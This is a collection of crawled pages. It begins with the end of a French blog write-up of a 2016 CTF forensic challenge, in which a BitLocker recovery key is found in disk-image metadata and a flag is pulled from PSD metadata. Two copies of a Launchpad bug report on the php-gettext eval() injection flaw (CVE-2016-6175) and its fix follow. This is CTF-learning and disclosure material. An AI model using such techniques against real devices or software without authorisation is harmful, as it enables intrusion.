et que cette dernière est de la forme **8 x 6** chars séparés par des "**-**".

Nous nous replongeons dans la collecte d'info faites en amont et remarquons quelques chose d'étrange.

Il s'agit d'une note contenue dans les métadata du dump initial ewf et qui n'est sûrement pas le fruit du hasard rappellez-vous de cela:

ewfinfo CTF\_security\_day\_2016.s01
ewfinfo 20140608

Acquiry information
        Case number:                1
        Description:                Security Day ESGI 2016 - Level: easy
        Examiner name:              IT Forensic investigator
        Evidence number:            1
        Notes:                     **578589-646712-118349-156013-637549-351670-297187-312191**
        Acquisition date:           Thu Mar  3 03:17:59 2016
        System date:                Thu Mar  3 03:17:59 2016
        Operating system used:      Linux
        Software version used:      20130416
        Password:                   N/A
        Model:                      DataBar USB2.0

Nous tentons alors de pratiquer de cette manière afin de bypasser la clef du Bitlocker et...

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPXOdZuvNxOWEF6C_UtzXYWpLzuP_hfZPWH6Q-QPKJE5bYz2Bc8gpa4LFziphvIgzZbDVgebWO3aXCtpLoPGjIST_RXBTxsN8a58Q5dtuCPJSgq8INLUwrYszQ2LFJY036wiZJqSoriPej/s640/475B08A3-79B3-43E4-A4B5-B9E6218E5087.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPXOdZuvNxOWEF6C_UtzXYWpLzuP_hfZPWH6Q-QPKJE5bYz2Bc8gpa4LFziphvIgzZbDVgebWO3aXCtpLoPGjIST_RXBTxsN8a58Q5dtuCPJSgq8INLUwrYszQ2LFJY036wiZJqSoriPej/s1600/475B08A3-79B3-43E4-A4B5-B9E6218E5087.png)

Le container nous offre deux fichiers: le 1er contenant juste un peu de texte rappellant les obectifs du challenges, le second quant à lui étant un .psd que l'on s'empresse d'ouvrir sous **Gimp** ce qui nous permet d'identifier des claques présent cachant un flag dans la bouche d'un espèce de dinosaure.

Image de base avec la bonne promo pour la boite de notre ami @Sug4r7 qui a créer ce chall:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQbI7XXI5kQHHHwG0k9AbsOIjILKswt1Wtdld6pEvBBIwmVcn4pxV3TxV58UahvHGXzk5D3eU5ISNMdrrdDtFyS1kwOI2KUiTuPFR0l3HkW7GaaBMJ0cC35TcW6EAkNhNeMT-lbsW05/s640/CTF_1.info.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQbI7XXI5kQHHHwG0k9AbsOIjILKswt1Wtdld6pEvBBIwmVcn4pxV3TxV58UahvHGXzk5D3eU5ISNMdrrdDtFyS1kwOI2KUiTuPFR0l3HkW7GaaBMJ0cC35TcW6EAkNhNeMT-lbsW05/s1600/CTF_1.info.png)

 Les filtres:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTolq-mxzi1qjzrSMFGwY7YqD7YuyIhFH5MSoW78gaSnKVxTNhu_2p0NA7Z-HhbgIdltSBy2LKZdBtPiCMkQZKQ99FO7sxnNGTECz3eCKCid4bFgOnEZ1XrHcSp0hmrEKUzcsJhhLnItIe/s400/unnamed.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTolq-mxzi1qjzrSMFGwY7YqD7YuyIhFH5MSoW78gaSnKVxTNhu_2p0NA7Z-HhbgIdltSBy2LKZdBtPiCMkQZKQ99FO7sxnNGTECz3eCKCid4bFgOnEZ1XrHcSp0hmrEKUzcsJhhLnItIe/s1600/unnamed.png)

Le filtre "code\_ctf" attire immédiatement notre attention mais hélas se trouve illisible:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRJM_vS-gVsgoNcYUeIl1GNM-ZCEYUr-xnDYegJZETp0wD_ONRp5943jSkQAfk_b3d5K8ugakL7ir7JaMjQcwlBXMn8JWPGSbb2pgFgXp4bDwwvT9MKHm8zd-F3FUGtXbzCw0xqQIp1XPV/s400/index.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRJM_vS-gVsgoNcYUeIl1GNM-ZCEYUr-xnDYegJZETp0wD_ONRp5943jSkQAfk_b3d5K8ugakL7ir7JaMjQcwlBXMn8JWPGSbb2pgFgXp4bDwwvT9MKHm8zd-F3FUGtXbzCw0xqQIp1XPV/s1600/index.png)

Afin de gagner du temps, je décide donc de lire les métadata du fichier image de base via **exiftool** et obtient entre autre alors le fameux flag tant désiré.

> ```
> ExifTool Version Number         : 10.11
> File Name                       : CTF_1.info
> Directory                       : .
> File Size                       : 22 MB
> File Modification Date/Time     : 2016:03:03 01:42:37+01:00
> File Access Date/Time           : 2016:03:05 15:45:08+01:00
> File Inode Change Date/Time     : 2016:03:04 04:33:39+01:00
> File Permissions                : rwxrwxrwx
> File Type                       : PSD
> File Type Extension             : psd
> MIME Type                       : application/vnd.adobe.photoshop
> Num Channels                    : 3
> Image Height                    : 1600
> Image Width                     : 2560
> Bit Depth                       : 8
> Current IPTC Digest             : cdcffa7da8c7be09057076aeaf05c34e
> Coded Character Set             : UTF8
> Application Record Version      : 0
> IPTC Digest                     : cdcffa7da8c7be09057076aeaf05c34e
> XMP Toolkit                     : Adobe XMP Core 5.5-c021 79.155772, 2014/01/13-19:44:00
> Document ID                     : adobe:docid:photoshop:8e502fea-e0d3-11e5-88dd-8346bba80fd1
> Instance ID                     : xmp.iid:a366f090-0622-9343-b206-ee4e314c205f
> Original Document ID            : 54597A271ED407F91E4348F2B8D7EDD3
> History Action                  : saved, converted, derived, saved, saved
> History Instance ID             : xmp.iid:4e124a83-f328-dd45-bc25-d93c357610c7, xmp.iid:229920ec-c5e4-f34c-84f6-4a06983a49ff, xmp.iid:a366f090-0622-9343-b206-ee4e314c205f
> History When                    : 2016:03:03 01:05:46+01:00, 2016:03:03 01:05:46+01:00, 2016:03:03 01:42:37+01:00
> History Software Agent          : Adobe Photoshop CC 2014 (Windows), Adobe Photoshop CC 2014 (Windows), Adobe Photoshop CC 2014 (Windows)
> History Changed                 : /, /, /
> History Parameters              : from image/jpeg to application/vnd.adobe.photoshop, converted from image/jpeg to application/vnd.adobe.photoshop
> Derived From Instance ID        : xmp.iid:4e124a83-f328-dd45-bc25-d93c357610c7
> Derived From Document ID        : 54597A271ED407F91E4348F2B8D7EDD3
> Derived From Original Document ID: 54597A271ED407F91E4348F2B8D7EDD3
> Format                          : application/vnd.adobe.photoshop
> Color Mode                      : RGB
> Text Layer Name                 : code_ctf
> Text Layer Text                 : CODE CTF: 20160303_A27R425
> Document Ancestors              : 54597A271ED407F91E4348F2B8D7EDD3
> Create Date                     : 2016:03:03 00:59:27+01:00
> Metadata Date                   : 2016:03:03 01:42:37+01:00
> X Resolution                    : 72
> Displayed Units X               : inches
> Y Resolution                    : 72
> Displayed Units Y               : inches
> Global Angle                    : 30
> Global Altitude                 : 30
> Photoshop Thumbnail             : (Binary data 4789 bytes, use -b option to extract)
> Has Real Merged Data            : No
> Writer Name                     : Adobe Photoshop
> Reader Name                     : Adobe Photoshop CC 2014
> Exif Byte Order                 : Big-endian (Motorola, MM)
> Bits Per Sample                 : 8 8 8
> Photometric Interpretation      : RGB
> Orientation                     : Horizontal (normal)
> Samples Per Pixel               : 3
> Resolution Unit                 : inches
> Software                        : Adobe Photoshop CC 2014 (Windows)
> Modify Date                     : 2016:03:03 01:42:37
> Exif Version                    : 0221
> Color Space                     : Uncalibrated
> Exif Image Width                : 2560
> Exif Image Height               : 1600
> Compression                     : JPEG (old-style)
> Thumbnail Offset                : 386
> Thumbnail Length                : 0
> Image Size                      : 2560x1600
> Megapixels                      : 4.1
> ```

**CODE CTF: 20160303\_A27R425**

Malheureusement il ne nous permis pas de valider cette épreuve car sans l'adresse mail du destinataire impossible de le valider.... frustration extême car cela nous pris tout de même pas mal de temps pour au final 0 points!

Cela étant, ça méritait bien un petit write-up ne serait-ce que parcequ'il ne fû validé qu'une seule fois par la team gagnante et que d'autre aimerait sûrement savoir comment il fallait procéder ;-).

Le mail pour sa part ne semblait réèllement pas présent ici, en tout cas pas à notre connaissance et la fin de ce CTF arriva avec pour la **sec0d** la 5ème place et des cadeaux tout de même obtenus!! :-)

A bientôt pour un prochain writeup ou paper.

kmkz

**Quelques liens utiles pour ce challenge Forensic**

[mmls](http://www.sleuthkit.org/sleuthkit/man/mmls.html)

[mbr\_parser.py](https://raw.githubusercontent.com/gleeda/misc-scripts/master/misc_python/mbr_parser.py)

[ForensicWiki](http://www.forensicswiki.org/wiki/Encase_image_file_format)

[EWF tools](http://www.forensicswiki.org/wiki/Libewf)

<http://www.cnwrecovery.com/html/e01_and_virtual.html>

<http://blog.stalkr.net/2010/05/defcon-18-ctf-quals-writeup-forensics.html>

(en souvenir pour les kewpins: sec0d à la remise des prix)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1pt5BAOPfqd_25nMUyWS94kVI_wjPHuRKJ9czS7AybL_o_MXWb105VgznKckHsiz623sr-quaNne6IaOPWjesvgUoKLjJhLZoavPcSDdxHwJsYOcOUXW6_XInnBItczHcONYJrupTcN74/s640/sec0d.jpeg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1pt5BAOPfqd_25nMUyWS94kVI_wjPHuRKJ9czS7AybL_o_MXWb105VgznKckHsiz623sr-quaNne6IaOPWjesvgUoKLjJhLZoavPcSDdxHwJsYOcOUXW6_XInnBItczHcONYJrupTcN74/s1600/sec0d.jpeg)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[18:21](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1073820262794932851)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1073820262794932851&from=pencil "Modifier l'article")

[Articles plus récents](https://kmkz-web-blog.blogspot.com/search?updated-max=2017-03-28T11:19:00%2B02:00&max-results=1&reverse-paginate=true "Articles plus récents")

[Articles plus anciens](https://kmkz-web-blog.blogspot.com/search?updated-max=2016-03-05T18:21:00%2B01:00&max-results=1 "Articles plus anciens")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Articles (Atom)](https://kmkz-web-blog.blogspot.com/feeds/posts/default)

## Archives

* ►
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)

* ▼
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
  + ▼
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
    - [[Write-Up] ESGI CTF 2k16 ForensicGio (Forensic 400)](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from bugs.launchpad.net_7c04afa8_20250126_100211.html ===

[Log in / Register](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Blogin)

[![](https://launchpadlibrarian.net/98928519/php-gettext-icon-large.png)](https://launchpad.net/php-gettext)

## [php-gettext](https://launchpad.net/php-gettext)

* [Overview](https://launchpad.net/php-gettext)
* [Code](https://code.launchpad.net/php-gettext)
* [Bugs](https://bugs.launchpad.net/php-gettext)
* [Blueprints](https://blueprints.launchpad.net/php-gettext)
* [Translations](https://translations.launchpad.net/php-gettext)
* [Answers](https://answers.launchpad.net/php-gettext)

# Use of eval too unrestrictive

Bug #1606184 reported by
[Данило Шеган](https://launchpad.net/~danilo)
on 2016-07-25

[268](/%2Bhelp-bugs/bug-heat.html)

This bug affects 3 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [php-gettext](https://bugs.launchpad.net/php-gettext) | Triaged | Critical | [Данило Шеган](https://launchpad.net/~danilo) |  |

### Bug Description

php-gettext code that parses the plural forms header relies on eval() and only filters out some known-bad characters before passing the value from a MO file in directly to eval().

It was assumed that PO and MO files would come from trusted translators, without any attempts to potentially exploit the service being translated. While there was still no case where this has been exploited, we should move to the same parsing logic gettext C library uses:

\* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural-exp.c>

  \* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural-exp.h>

  \* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y>

This has been reported by Jean-Marie Bourbon as affecting NagVis, which has since fixed it by commenting out all the plural forms code: <https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>

Jean-Marie was also kind enough to start a CVE 2016-6175 for this issue.

See [original description](comments/0)

## CVE References

* [2016-6175](/bugs/cve/2016-6175 "Eval injection vulnerability in php-g...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Данило Шеган (danilo)](https://launchpad.net/~danilo) wrote on 2016-07-25: |  |  | [#1](/php-gettext/%2Bbug/1606184/comments/1) |
| --- | --- | --- | --- |

* [php-gettext\_advisory.pdf](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/4706987/%2Bfiles/php-gettext_advisory.pdf)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/4706987)
  (113.3 KiB,
  application/pdf)

[Данило Шеган (danilo)](https://launchpad.net/~danilo)
on 2016-07-25

| **description**: | updated |
| --- | --- |
| **information type**: | Private Security → Public Security |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Michal Čihař (nijel)](https://launchpad.net/~nijel) wrote on 2017-01-17: |  |  | [#2](/php-gettext/%2Bbug/1606184/comments/2) |
| --- | --- | --- | --- |

Removing usage of eval() was one of reasons why we've forked php-gettext at phpMyAdmin, see <https://github.com/phpmyadmin/motranslator/>. It is not a drop in replacement, but can provide compatible API.

Removing usage of eval() was one of reasons why we've forked php-gettext at phpMyAdmin, see https://github.com/phpmyadmin/motranslator/. It is not a drop in replacement, but can provide compatible API.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-06-18: |  |  | [#3](/php-gettext/%2Bbug/1606184/comments/3) |
| --- | --- | --- | --- |

Applications such as Tiny Tiny RSS continue to use the php-gettext library. Due this issue, they are are at risk of not getting included in next release of Debian and FreedomBox.

To address this, I have implemented a parser for the plurals expressions instead of using the eval() method as discussed in this bug as solution. This patch is under the same license as php-gettext (GPLv2 or higher).

- A simple operator-precedence parser that prioritizes simplicity and readability. Avoid using eval() for evaluating plural expressions.

  - Fixes CVE-2016-6175.

  - Fixes upstream bug [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

  - Fixes Debian bug <https://bugs.debian.org/851771>

- Grammar for parsing code is same as the grammar for GNU gettext library: <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y>

- Extensive tests for various locales with help from Unicode's plurals rules. Tests for invalid syntax and expression parsing.

Please consider applying the patch and making a new release of php-gettext. Many thanks to the authors for the original implementation.

Applications such as Tiny Tiny RSS continue to use the php-gettext library. Due this issue, they are are at risk of not getting included in next release of Debian and FreedomBox.
To address this, I have implemented a parser for the plurals expressions instead of using the eval() method as discussed in this bug as solution. This patch is under the same license as php-gettext (GPLv2 or higher).
- A simple operator-precedence parser that prioritizes simplicity and readability. Avoid using eval() for evaluating plural expressions.
- Fixes CVE-2016-6175.
- Fixes upstream bug https://bugs.launchpad.net/php-gettext/+bug/1606184
- Fixes Debian bug https://bugs.debian.org/851771
- Grammar for parsing code is same as the grammar for GNU gettext library: http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y
- Extensive tests for various locales with help from Unicode's plurals rules. Tests for invalid syntax and expression parsing.
Please consider applying the patch and making a new release of php-gettext. Many thanks to the authors for the original implementation.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-06-18: |  |  | [#4](/php-gettext/%2Bbug/1606184/comments/4) |
| --- | --- | --- | --- |

* [Adopt tests to run recent version of phpunit](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5384873/%2Bfiles/0002-Adopt-tests-to-run-recent-version-of-phpunit.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5384873)
  (1.7 KiB,
  text/plain)

Also tests need to be updated to run with recent versions of phpunit.

Also tests need to be updated to run with recent versions of phpunit.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-07-15: |  |  | [#5](/php-gettext/%2Bbug/1606184/comments/5) |
| --- | --- | --- | --- |

It would be nice to have these patches applied as Debian is planning to drop php-gettext for the next release Bullseye due this security issue.

It would be nice to have these patches applied as Debian is planning to drop php-gettext for the next release Bullseye due this security issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-12-03: |  |  | [#6](/php-gettext/%2Bbug/1606184/comments/6) |
| --- | --- | --- | --- |

* [Use custom parser for parsing plural expressions instead of eval()](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5440422/%2Bfiles/0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5440422)
  (38.1 KiB,
  text/plain)

The earlier patch contains a silly mistake I made. This version fixes the problem.

By the way, Debian package for php-gettext now carries this plural parser.

The earlier patch contains a silly mistake I made. This version fixes the problem.
By the way, Debian package for php-gettext now carries this plural parser.

[See full activity log](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/php-gettext/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/php-gettext/%2Bbug/1606184/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [Adopt tests to run recent version of phpunit](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5384873/%2Bfiles/0002-Adopt-tests-to-run-recent-version-of-phpunit.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5384873 "Change patch details")
* [Use custom parser for parsing plural expressions instead of eval()](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5440422/%2Bfiles/0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5440422 "Change patch details")

* [Add patch](/php-gettext/%2Bbug/1606184/%2Baddcomment?field.patch=on)

## Bug attachments

* [php-gettext\_advisory.pdf](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/4706987/%2Bfiles/php-gettext_advisory.pdf)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/4706987 "Change attachment details")

* [Add attachment](/php-gettext/%2Bbug/1606184/%2Baddcomment)

## Remote bug watches

* [debbugs #851771](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=851771)

  [done grave jessie-ignore buster-ignore security stretch-ignore patch wheezy-ignore upstream]
  [Edit](/bugs/1606184/%2Bwatch/139365 "Change watch details")

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.launchpad.net_1df70fdf_20250126_100209.html ===

[Log in / Register](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Blogin)

[![](https://launchpadlibrarian.net/98928519/php-gettext-icon-large.png)](https://launchpad.net/php-gettext)

## [php-gettext](https://launchpad.net/php-gettext)

* [Overview](https://launchpad.net/php-gettext)
* [Code](https://code.launchpad.net/php-gettext)
* [Bugs](https://bugs.launchpad.net/php-gettext)
* [Blueprints](https://blueprints.launchpad.net/php-gettext)
* [Translations](https://translations.launchpad.net/php-gettext)
* [Answers](https://answers.launchpad.net/php-gettext)

# Use of eval too unrestrictive

Bug #1606184 reported by
[Данило Шеган](https://launchpad.net/~danilo)
on 2016-07-25

[268](/%2Bhelp-bugs/bug-heat.html)

This bug affects 3 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [php-gettext](https://bugs.launchpad.net/php-gettext) | Triaged | Critical | [Данило Шеган](https://launchpad.net/~danilo) |  |

### Bug Description

php-gettext code that parses the plural forms header relies on eval() and only filters out some known-bad characters before passing the value from a MO file in directly to eval().

It was assumed that PO and MO files would come from trusted translators, without any attempts to potentially exploit the service being translated. While there was still no case where this has been exploited, we should move to the same parsing logic gettext C library uses:

\* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural-exp.c>

  \* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural-exp.h>

  \* <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y>

This has been reported by Jean-Marie Bourbon as affecting NagVis, which has since fixed it by commenting out all the plural forms code: <https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>

Jean-Marie was also kind enough to start a CVE 2016-6175 for this issue.

See [original description](comments/0)

## CVE References

* [2016-6175](/bugs/cve/2016-6175 "Eval injection vulnerability in php-g...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Данило Шеган (danilo)](https://launchpad.net/~danilo) wrote on 2016-07-25: |  |  | [#1](/php-gettext/%2Bbug/1606184/comments/1) |
| --- | --- | --- | --- |

* [php-gettext\_advisory.pdf](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/4706987/%2Bfiles/php-gettext_advisory.pdf)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/4706987)
  (113.3 KiB,
  application/pdf)

[Данило Шеган (danilo)](https://launchpad.net/~danilo)
on 2016-07-25

| **description**: | updated |
| --- | --- |
| **information type**: | Private Security → Public Security |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Michal Čihař (nijel)](https://launchpad.net/~nijel) wrote on 2017-01-17: |  |  | [#2](/php-gettext/%2Bbug/1606184/comments/2) |
| --- | --- | --- | --- |

Removing usage of eval() was one of reasons why we've forked php-gettext at phpMyAdmin, see <https://github.com/phpmyadmin/motranslator/>. It is not a drop in replacement, but can provide compatible API.

Removing usage of eval() was one of reasons why we've forked php-gettext at phpMyAdmin, see https://github.com/phpmyadmin/motranslator/. It is not a drop in replacement, but can provide compatible API.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-06-18: |  |  | [#3](/php-gettext/%2Bbug/1606184/comments/3) |
| --- | --- | --- | --- |

Applications such as Tiny Tiny RSS continue to use the php-gettext library. Due this issue, they are are at risk of not getting included in next release of Debian and FreedomBox.

To address this, I have implemented a parser for the plurals expressions instead of using the eval() method as discussed in this bug as solution. This patch is under the same license as php-gettext (GPLv2 or higher).

- A simple operator-precedence parser that prioritizes simplicity and readability. Avoid using eval() for evaluating plural expressions.

  - Fixes CVE-2016-6175.

  - Fixes upstream bug [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

  - Fixes Debian bug <https://bugs.debian.org/851771>

- Grammar for parsing code is same as the grammar for GNU gettext library: <http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y>

- Extensive tests for various locales with help from Unicode's plurals rules. Tests for invalid syntax and expression parsing.

Please consider applying the patch and making a new release of php-gettext. Many thanks to the authors for the original implementation.

Applications such as Tiny Tiny RSS continue to use the php-gettext library. Due this issue, they are are at risk of not getting included in next release of Debian and FreedomBox.
To address this, I have implemented a parser for the plurals expressions instead of using the eval() method as discussed in this bug as solution. This patch is under the same license as php-gettext (GPLv2 or higher).
- A simple operator-precedence parser that prioritizes simplicity and readability. Avoid using eval() for evaluating plural expressions.
- Fixes CVE-2016-6175.
- Fixes upstream bug https://bugs.launchpad.net/php-gettext/+bug/1606184
- Fixes Debian bug https://bugs.debian.org/851771
- Grammar for parsing code is same as the grammar for GNU gettext library: http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y
- Extensive tests for various locales with help from Unicode's plurals rules. Tests for invalid syntax and expression parsing.
Please consider applying the patch and making a new release of php-gettext. Many thanks to the authors for the original implementation.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-06-18: |  |  | [#4](/php-gettext/%2Bbug/1606184/comments/4) |
| --- | --- | --- | --- |

* [Adopt tests to run recent version of phpunit](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5384873/%2Bfiles/0002-Adopt-tests-to-run-recent-version-of-phpunit.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5384873)
  (1.7 KiB,
  text/plain)

Also tests need to be updated to run with recent versions of phpunit.

Also tests need to be updated to run with recent versions of phpunit.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-07-15: |  |  | [#5](/php-gettext/%2Bbug/1606184/comments/5) |
| --- | --- | --- | --- |

It would be nice to have these patches applied as Debian is planning to drop php-gettext for the next release Bullseye due this security issue.

It would be nice to have these patches applied as Debian is planning to drop php-gettext for the next release Bullseye due this security issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sunil Mohan Adapa (f-su7il-g)](https://launchpad.net/~f-su7il-g) wrote on 2020-12-03: |  |  | [#6](/php-gettext/%2Bbug/1606184/comments/6) |
| --- | --- | --- | --- |

* [Use custom parser for parsing plural expressions instead of eval()](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184/%2Battachment/5440422/%2Bfiles/0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch)
  [Edit](/php-gettext/%2Bbug/1606184/%2Battachment/5440422)
  (38.1 KiB,
  text/plain)

The earlier patch contains a silly mistake I made. This version fixes the problem.

By the way, Debian package for php-gettext now carries this plural parser.

The earlier patch contains a silly mistake I made. This version fixes the problem.
